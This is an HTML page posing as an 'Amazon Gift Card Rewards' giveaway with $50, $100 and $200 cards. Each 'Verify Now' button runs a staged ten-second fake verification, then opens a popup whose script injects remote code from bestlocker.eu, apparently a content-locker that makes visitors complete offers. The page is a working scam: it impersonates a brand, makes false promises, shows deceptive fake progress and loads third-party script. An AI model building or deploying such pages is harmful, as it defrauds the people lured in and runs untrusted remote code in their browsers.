<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Amazon Gift Card Rewards</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #111;
      overflow-x: hidden;
      height: 100vh;
      color: #fff;
    }

    .container {
      text-align: center;
      padding: 40px 20px;
      z-index: 2;
    }

    /* Headline typing animation */
    h1 {
      font-size: 2rem;
      color: #fff;
      margin-bottom: 30px;
      text-shadow: 0 0 15px #ff9900;
      white-space: nowrap;
      border-right: 3px solid #ff9900;
      width: 22ch;
      overflow: hidden;
      animation: typing 4s steps(22), blink .75s step-end infinite alternate;
    }
    @keyframes typing {
      from { width: 0 }
    }
    @keyframes blink {
      50% { border-color: transparent }
    }

    /* Card Grid */
    .cards {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 20px;
      margin-top: 30px;
    }

    /* Amazon Gift Card Style */
    .card {
      padding: 20px;
      border-radius: 20px;
      background: rgba(255,255,255,0.1);
      backdrop-filter: blur(10px);
      border: 2px solid rgba(255,153,0,0.7);
      box-shadow: 0 4px 15px rgba(255,153,0,0.3);
      transition: transform 0.3s;
      cursor: pointer;
    }
    .card:hover {
      transform: translateY(-5px);
    }
    .card h2 { color: #FF9900; }

    /* Verify Button */
    .verify-btn {
      margin-top: 15px;
      padding: 12px 20px;
      font-size: 1rem;
      border: none;
      border-radius: 30px;
      background: #FF9900;
      color: #111;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 0 15px rgba(255,153,0,0.6);
      transition: all 0.3s;
    }
    .verify-btn:hover { background: #e68a00; }

    /* Button Spinner */
    .loading {
      border: 3px solid #f3f3f3;
      border-top: 3px solid #FF9900;
      border-radius: 50%;
      width: 20px;
      height: 20px;
      animation: spin 1s linear infinite;
      display: inline-block;
      vertical-align: middle;
      margin-right: 8px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Popup Glassmorphism */
    .popup {
      display: none;
      position: fixed;
      z-index: 9999;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.7);
      backdrop-filter: blur(8px);
    }
    .popup-content {
      background: rgba(255,255,255,0.1);
      backdrop-filter: blur(20px);
      border: 2px solid;
      border-image: linear-gradient(45deg, #ff9900, #ff00ff, #00ffff) 1;
      border-radius: 20px;
      width: 90%;
      max-width: 500px;
      margin: 8% auto;
      padding: 30px 20px;
      position: relative;
      box-shadow: 0 0 25px rgba(255,153,0,0.5);
      color: #fff;
      text-align: center;
      min-height: 200px;
    }
    .close-btn {
      position: absolute;
      top: 8px; right: 12px;
      font-size: 28px;
      font-weight: bold;
      color: #fff;
      cursor: pointer;
      text-shadow: 0 0 10px #ff9900;
    }

    /* Popup Spinner */
    .popup-spinner {
      border: 6px solid rgba(255,255,255,0.2);
      border-top: 6px solid #ff9900;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      margin: 50px auto;
      animation: spin 1s linear infinite;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üéÅ Free Amazon Gift Card</h1>
    <div class="cards">
      <div class="card">
        <h2>$50 Amazon Gift Card</h2>
        <p>Unlock this reward instantly</p>
        <button class="verify-btn" onclick="startVerification(this)">Verify Now</button>
      </div>
      <div class="card">
        <h2>$100 Amazon Gift Card</h2>
        <p>Exclusive limited-time reward</p>
        <button class="verify-btn" onclick="startVerification(this)">Verify Now</button>
      </div>
      <div class="card">
        <h2>$200 Amazon Gift Card</h2>
        <p>Premium reward for VIP users</p>
        <button class="verify-btn" onclick="startVerification(this)">Verify Now</button>
      </div>
    </div>
  </div>

  <!-- Popup -->
  <div id="verifyPopup" class="popup">
    <div class="popup-content">
      <span class="close-btn">&times;</span>
      <div id="verify-box"></div>
    </div>
  </div>

  <script>
    // Button loading then popup
    function startVerification(btn) {
      btn.disabled = true;
      let originalText = btn.innerHTML;
      btn.innerHTML = '<span class="loading"></span> Verifying...';

      setTimeout(() => {
        btn.innerHTML = originalText;
        btn.disabled = false;
        openVerifyPopup();
      }, 10000); // 10 sec loading
    }

    // Popup open with spinner then locker
    function openVerifyPopup() {
      let popup = document.getElementById("verifyPopup");
      let box = document.getElementById("verify-box");
      popup.style.display = "block";
      box.innerHTML = '<div class="popup-spinner"></div><p>Please wait...</p>';

      setTimeout(() => {
        box.innerHTML = "";
        var s = document.createElement("script");
        s.type = "text/javascript";
        s.src = "https://bestlocker.eu/iframeLoader/9c03b476-84b9-11f0-948d-8a5fb7be40ea";
        box.appendChild(s);
      }, 3000); // 3 sec spinner inside popup
    }

    // Close popup
    document.querySelector(".close-btn").onclick = () => {
      document.getElementById("verifyPopup").style.display = "none";
      document.getElementById("verify-box").innerHTML = "";
    };
  </script>
</body>
</html>
